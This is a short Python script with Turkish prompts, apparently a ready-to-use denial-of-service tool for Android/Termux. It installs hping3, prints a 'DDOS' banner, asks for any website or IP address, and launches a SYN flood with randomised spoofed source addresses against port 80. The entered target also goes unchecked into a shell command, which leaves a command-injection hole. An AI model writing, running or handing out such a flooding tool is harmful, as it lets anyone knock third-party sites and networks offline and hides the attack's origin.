#!usr/bin/env python3
# -*- coding:utf-8 -*-

import os


os.system("clear")
sor = input ("\n        UYARI BU ARAÇ ANDROİD TELEFONLARDA ROOT GEREKTİREBİLİR\n\nDevam Etmek İstiyormusun[E/h]  ")
if sor=="e" or sor=="E":
	os.system("apt install figlet")
	os.system("apt install hping3")
	os.system("clear")
	banner = """\033[94m\033[1m
____  ____   ___  ____  
|  _ \|  _ \ / _ \/ ___| 
| | | | | | | | | \___ \ 
| |_| | |_| | |_| |___) |
|____/|____/ \___/|____/
			
			"""
	print(banner)
	sor1 = input("Site Veya IP Adresi Giriniz:  ")
	os.system("hping3 -S " + sor1 + " -p 80-c 100000000 -d 100  --flood --rand-source ")